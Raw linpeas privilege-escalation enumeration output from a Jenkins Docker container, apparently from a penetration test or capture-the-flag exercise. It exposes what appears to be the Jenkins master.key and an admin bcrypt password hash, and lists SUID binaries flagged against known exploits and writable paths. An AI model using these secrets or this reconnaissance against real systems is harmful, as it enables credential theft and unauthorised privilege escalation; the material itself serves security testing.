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
=YltV
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 2410 Jul 18  2020 /var/lib/apt/lists/deb.debian.org_debian_dists_stretch_Release[1;31m.gpg[0m
-----BEGIN PGP SIGNATURE-----
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
Ds4G
=cqbr
-----END PGP SIGNATURE-----



[1;34m╔══════════╣ [1;32mAnalyzing Jenkins Files (limit 70)
[0m-rw-r--r-- 1 jenkins jenkins 256 Aug  3  2020 /var/jenkins_home/secrets/[1;31mmaster.key[0m
[1;31m5354f116835133ad1273b83a07d25e0eff524d19fcea2f5de32373169a7b0ef8b30e84a1b1b414e8bf9fc80f72f2ce6db34df700038fb76f73e74cd9ea4e8b3e998ed3f715e444ba6ada6ba9adce287001d496af0174a310a0ba90eec85f7d5bf092cace21f3fb76d9d8f96702897dae8b51c3f76c81b7db53c62c16360659bd[0m

-rw-r--r-- 1 jenkins jenkins 272 Aug  3  2020 /var/jenkins_home/secrets/[1;31mhudson.util.Secret[0m
[1;31mBinary file (standard input) matches[0m


-rw-r--r-- 1 jenkins jenkins 1645 Oct  4 21:08 /var/jenkins_home/[1;31mconfig.xml[0m
-rw-r--r-- 1 jenkins jenkins 2712 Aug  3  2020 /var/jenkins_home/users/admin_3190494404640478712/[1;31mconfig.xml[0m
      <[1;31mpasswordHash>#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe</passwordHash>[0m

drwxr-xr-x 2 jenkins jenkins 4096 Oct  4 21:08 /tmp/hsperfdata_[1;31mjenkins[0m

drwxr-xr-x 1 root root 4096 Jul 28  2020 /usr/share/[1;31mjenkins[0m

drwxr-xr-x 3 jenkins jenkins 4096 Aug  3  2020 /var/jenkins_home/plugins/lockable-resources/META-INF/maven/org.6wind.[1;31mjenkins[0m


[1;34m╔══════════╣ [1;32mAnalyzing Other Interesting Files (limit 70)
[0m-rw-r--r-- 1 root root 3526 May 15  2017 /etc/skel/[1;31m.bashrc[0m





-rw-r--r-- 1 root root 675 May 15  2017 /etc/skel/[1;31m.profile[0m






[1;34m                      ╔════════════════════════════════════╗
══════════════════════╣ [1;32mFiles with Interesting Permissions[1;34m ╠══════════════════════
[1;34m                      ╚════════════════════════════════════╝[0m
[1;34m╔══════════╣ [1;32mSUID - Check easy privesc, exploits and write perms
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
[0m[1;90mstrings Not Found
[0m[1;90mstrace Not Found
[0m-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin[1;31m/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8[0m
-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin[1;31m/umount  --->  BSD/Linux(08-1996)[0m
-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin[1;32m/ping[0m
-rwsr-xr-x 1 root root 40K May 17  2017 /bin[1;32m/su[0m
-rwsr-xr-x 1 root root 75K May 17  2017 /usr/bin[1;32m/gpasswd[0m
-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin[1;31m/newgrp  --->  HP-UX_10.20[0m
-rwsr-xr-x 1 root root 49K May 17  2017 /usr/bin[1;31m/chfn  --->  SuSE_9.3/10[0m
-rwsr-xr-x 1 root root 59K May 17  2017 /usr/bin[1;31m/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)[0m
-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin[1;32m/chsh[0m
-rwsr-xr-x 1 root root 431K Jul 15  2019 /usr/lib/openssh[1;32m/ssh-keysign[0m

[1;34m╔══════════╣ [1;32mSGID
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
[0m-rwxr-sr-x 1 root shadow 35K May 27  2017 /sbin[1;32m/unix_chkpwd[0m
-rwxr-sr-x 1 root shadow 23K May 17  2017 /usr/bin[1;32m/expiry[0m
-rwxr-sr-x 1 root shadow 71K May 17  2017 /usr/bin[1;32m/chage[0m
-rwxr-sr-x 1 root tty 27K Mar  7  2018 /usr/bin[1;32m/wall[0m
-rwxr-sr-x 1 root ssh 351K Jul 15  2019 /usr/bin[1;32m/ssh-agent[0m

[1;34m╔══════════╣ [1;32mChecking misconfigurations of ld.so
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
[0m[1;32m[3m/etc/ld.so.conf
[0mContent of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

[1;32m[3m/etc/ld.so.conf.d
[0m[1;32m[3m  /etc/ld.so.conf.d/docker-openjdk.conf
[0m[3m  - [1;32m/usr/local/openjdk-8/lib/amd64[0m[0m
[3m  - [1;32m/usr/local/openjdk-8/lib/amd64/jli[0m[0m
[1;32m[3m  /etc/ld.so.conf.d/libc.conf
[0m[3m  - [1;32m/usr/local/lib[0m[0m
[1;32m[3m  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
[0m[3m  - [1;32m/lib/x86_64-linux-gnu[0m[0m
[3m  - [1;32m/usr/lib/x86_64-linux-gnu[0m[0m

[3m[1;32m/etc/ld.so.preload
[0m[1;34m╔══════════╣ [1;32mCapabilities
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
[0m[1;34m══╣ [1;32mCurrent shell capabilities
[0mCapInh:	00000000a80425fb
[1;32mCapPrm:	0000000000000000[0m
[1;32mCapEff:	0000000000000000[0m
CapBnd:	00000000a80425fb
[1;32mCapAmb:	0000000000000000[0m

[1;34m══╣ [1;32mParent proc capabilities
[0mCapInh:	00000000a80425fb
[1;32mCapPrm:	0000000000000000[0m
[1;32mCapEff:	0000000000000000[0m
CapBnd:	00000000a80425fb
[1;32mCapAmb:	0000000000000000[0m


Files with capabilities (limited to 50):

[1;34m╔══════════╣ [1;32mFiles with ACLs (limited to 50)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
[0m[1;90mfiles with acls in searched folders Not Found
[0m
[1;34m╔══════════╣ [1;32mFiles (scripts) in /etc/profile.d/
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
[0mtotal 12
drwxr-xr-x 2 root root 4096 Sep  8  2019 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..

[1;34m╔══════════╣ [1;32mPermissions in init, init.d, systemd, and rc.d
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
[0m
[1;34m═╣ [1;32mHashes inside passwd file? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mWritable passwd file? ................ [0m[1;90mNo
[0m[1;34m═╣ [1;32mCredentials in fstab/mtab? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read shadow files? ............. [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read shadow plists? ............ [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I write shadow plists? ........... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read opasswd file? ............. [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I write in network-scripts? ...... [0m[1;90mNo
[0m[1;34m═╣ [1;32mCan I read root folder? .............. [0m[1;90mNo
[0m
[1;34m╔══════════╣ [1;32mSearching root files in home dirs (limit 30)
[0m/home/
/root/
/var/[1;96m[1;31mjenkins[0m[0m_home/tini_pub.gpg

[1;34m╔══════════╣ [1;32mSearching folders owned by me containing others files on it (limit 100)
[0m-rw-rw-r-- 1 [1;13mroot[0m [1;13mroot[0m 7152 Jul 28  2020 /var/[1;96m[1;95mjenkins[0m[0m_home/tini_pub.gpg

[1;34m╔══════════╣ [1;32mReadable files belonging to root and readable by me but not world readable
[0m
[1;34m╔══════════╣ [1;32mInteresting writable files owned by me or writable by everyone (not in Home) (max 500)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
[0m/dev/mqueue
/dev/shm
/run/lock
/tmp
/tmp/hsperfdata_jenkins
/tmp/hsperfdata_jenkins/6
/tmp/jetty-0_0_0_0-8080-war-_-any-2385313934447407628.dir
/tmp/jetty-0_0_0_0-8080-war-_-any-664976788483532735.dir
/tmp/linpeas.log
/tmp/linpeas[1;31m.sh[0m
/tmp/winstone4805797399595250733.jar
[3m#)You_can_write_even_more_files_inside_last_directory
[0m
/usr/share/jenkins/ref
/usr/share/jenkins/ref/init.groovy.d
/var/jenkins_home
/var/tmp

[1;34m╔══════════╣ [1;32mInteresting GROUP writable files (not in Home) (max 500)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
[0m


[1;34m                            ╔═════════════════════════╗
════════════════════════════╣ [1;32mOther Interesting Files[1;34m ╠════════════════════════════
[1;34m                            ╚═════════════════════════╝[0m
[1;34m╔══════════╣ [1;32m.sh files in path
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
[0m/usr/local/bin/install-plugins.sh
/usr/local/bin/plugins.sh
/usr/local/bin/jenkins.sh

[1;34m╔══════════╣ [1;32mExecutable files potentially added by user (limit 70)
[0m2020-08-03+03:07:51.4686161420 /.dockerenv

[1;34m╔══════════╣ [1;32mUnexpected in /opt (usually empty)
[0mtotal 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt

[1;34m╔══════════╣ [1;32mUnexpected in root
[0m[1;31m/.dockerenv[0m

[1;34m╔══════════╣ [1;32mModified interesting files in the last 5mins (limit 100)
[0m[1;31m/tmp/hsperfdata_jenkins[0m/6
[1;31m/var/jenkins_home[0m/.gnupg/trustdb.gpg
[1;31m/var/jenkins_home[0m/.gnupg/pubring.kbx


[1;34m╔══════════╣ [1;32mFiles inside /var/jenkins_home (limit 20)
[0mtotal 140
drwxr-xr-x 16 jenkins jenkins  4096 Oct  4 22:10 .
drwxr-xr-x  1 root    root     4096 Jul 28  2020 ..
drwxr-xr-x  3 jenkins jenkins  4096 Aug  3  2020 .cache
drwx------  3 jenkins jenkins  4096 Oct  4 22:11 .gnupg
drwxr-xr-x  3 jenkins jenkins  4096 Aug  3  2020 .groovy
drwxr-xr-x  3 jenkins jenkins  4096 Aug  3  2020 .java
-rw-r--r--  1 jenkins jenkins     0 Oct  4 21:08 .lastStarted
-rw-r--r--  1 jenkins jenkins    38 Aug  9  2020 .owner
-rw-r--r--  1 jenkins jenkins   475 Aug  3  2020 com.cloudbees.hudson.plugins.folder.config.AbstractFolderConfiguration.xml
-rw-r--r--  1 jenkins jenkins  1645 Oct  4 21:08 config.xml
-rw-r--r--  1 jenkins jenkins   450 Oct  4 21:08 copy_reference_file.log
-rw-r--r--  1 jenkins jenkins   156 Oct  4 21:08 hudson.model.UpdateCenter.xml
-rw-r--r--  1 jenkins jenkins   370 Aug  3  2020 hudson.plugins.git.GitTool.xml
-rw-------  1 jenkins jenkins  1712 Aug  3  2020 identity.key.enc
-rw-r--r--  1 jenkins jenkins     5 Aug  3  2020 jenkins.install.InstallUtil.lastExecVersion
-rw-r--r--  1 jenkins jenkins     5 Aug  3  2020 jenkins.install.UpgradeWizard.state
-rw-r--r--  1 jenkins jenkins   179 Aug  3  2020 jenkins.model.JenkinsLocationConfiguration.xml
-rw-r--r--  1 jenkins jenkins   171 Aug  3  2020 jenkins.telemetry.Correlator.xml
drwxr-xr-x  2 jenkins jenkins  4096 Aug  3  2020 jobs
drwxr-xr-x  3 jenkins jenkins  4096 Aug  3  2020 logs
-rw-r--r--  1 jenkins jenkins   907 Oct  4 21:08 nodeMonitors.xml
drwxr-xr-x  2 jenkins jenkins  4096 Aug  3  2020 nodes

[1;34m╔══════════╣ [1;32mFiles inside others home (limit 20)
[0m
[1;34m╔══════════╣ [1;32mSearching installed mail applications
[0m
[1;34m╔══════════╣ [1;32mMails (limit 50)
[0m
[1;34m╔══════════╣ [1;32mBackup files (limited 100)
[0m-rw-r--r-- 1 jenkins jenkins 129 Aug  9  2020 /var/jenkins_home/queue.xml[1;31m.bak[0m


[1;34m╔══════════╣ [1;32mWeb files?(output limit)
[0m
[1;34m╔══════════╣ [1;32mAll relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
[0m-rw-r--r-- 1 jenkins jenkins 38 Aug  9  2020 /var/jenkins_home/.owner
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-basic-steps/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/jackson2-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/structs/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-graph-analysis/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-stage-tags-metadata/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/durable-task/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/mailer/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/antisamy-markup-formatter/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-model-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/scm-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/timestamper/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/email-ext/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/momentjs/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-model-definition/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/gradle/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/apache-httpcomponents-client-4-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/ssh-credentials/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-scm-step/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-aggregator/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/junit/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/jsch/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/script-security/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-rest-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-support/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/ace-editor/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-stage-step/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/jdk-tool/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/plugin-util-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/token-macro/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/display-url-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-multibranch/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pam-auth/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-build-step/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/okhttp-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-milestone-step/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-durable-task-step/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/ant/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/trilead-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/ws-cleanup/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-input-step/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/command-launcher/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/bouncycastle-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-cps/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-cps-global-lib/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-step-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/credentials/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/branch-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/matrix-project/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/resource-disposer/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/jquery3-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/plain-credentials/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/handlebars/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/workflow-job/.timestamp2
